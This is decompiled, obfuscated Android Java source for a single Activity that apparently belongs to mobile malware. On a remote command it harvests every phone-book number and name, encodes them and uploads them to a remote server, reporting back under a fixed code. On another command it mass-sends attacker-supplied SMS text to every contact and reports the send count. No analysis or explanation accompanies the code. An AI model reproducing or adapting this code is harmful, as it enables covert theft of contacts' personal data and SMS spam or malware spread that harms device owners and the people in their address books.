package wocwvy.czyxoxmbauu.slsa.ncec;

import android.app.Activity;
import android.content.ContentResolver;
import android.content.Intent;
import android.database.Cursor;
import android.os.Bundle;
import android.provider.ContactsContract;
import wocwvy.czyxoxmbauu.slsa.C0020b;
import wocwvy.czyxoxmbauu.slsa.C0022c;

/* JADX INFO: loaded from: classes.dex */
public class wami extends Activity {

    /* JADX INFO: renamed from: a */
    C0020b f475a = new C0020b();

    /* JADX INFO: renamed from: b */
    C0022c f476b = new C0022c();

    /* JADX INFO: renamed from: a */
    public void m287a(ContentResolver contentResolver) {
        try {
            if (this.f475a.m251e(this, "getNumber").equals("true")) {
                return;
            }
            Cursor cursorQuery = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
            String str = "(" + this.f475a.m263p(this) + ") Numbers from the phone book";
            while (cursorQuery.moveToNext()) {
                String string = cursorQuery.getString(cursorQuery.getColumnIndex("data1"));
                String string2 = cursorQuery.getString(cursorQuery.getColumnIndex("display_name"));
                if (!string.contains("*") && !string.contains("#") && string.length() > 6 && !str.contains(string)) {
                    str = str + string + "     " + string2 + "</br>\n";
                }
            }
            C0020b c0020b = this.f475a;
            StringBuilder sb = new StringBuilder();
            sb.append("p=");
            sb.append(this.f475a.m242c(this.f475a.m264q(this) + "|" + str + "|"));
            c0020b.m235b(this, "4", sb.toString());
            this.f475a.m250d(this, "getNumber", "true");
            finish();
        } catch (Exception unused) {
            finish();
        }
    }

    /* JADX INFO: renamed from: a */
    public void m288a(ContentResolver contentResolver, String str) {
        Cursor cursorQuery = contentResolver.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
        boolean z = false;
        boolean z2 = false;
        int i = 0;
        while (cursorQuery.moveToNext()) {
            String string = cursorQuery.getString(cursorQuery.getColumnIndex("data1"));
            if (!string.contains("*") && !string.contains("#") && string.length() > 7) {
                try {
                    this.f475a.m245c(this, string, str);
                    i++;
                    z2 = true;
                } catch (Exception unused) {
                    C0020b c0020b = this.f475a;
                    StringBuilder sb = new StringBuilder();
                    sb.append("p=");
                    sb.append(this.f475a.m242c(this.f475a.m264q(this) + "|Error sending SMS, maybe there are no permission to send!|"));
                    c0020b.m235b(this, "4", sb.toString());
                }
            }
        }
        z = z2;
        if (z) {
            C0020b c0020b2 = this.f475a;
            StringBuilder sb2 = new StringBuilder();
            sb2.append("p=");
            sb2.append(this.f475a.m242c(this.f475a.m264q(this) + "|The dispatch was successful, " + i + " SMS sent|"));
            c0020b2.m235b(this, "4", sb2.toString());
        }
        finish();
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            Intent intent = getIntent();
            String stringExtra = intent.getStringExtra("str");
            String stringExtra2 = intent.getStringExtra("cwc_text");
            if (stringExtra.contains("0")) {
                m287a(getContentResolver());
            }
            if (stringExtra.contains("1")) {
                m288a(getContentResolver(), stringExtra2);
            }
            finish();
        } catch (Exception unused) {
            finish();
        }
    }
}
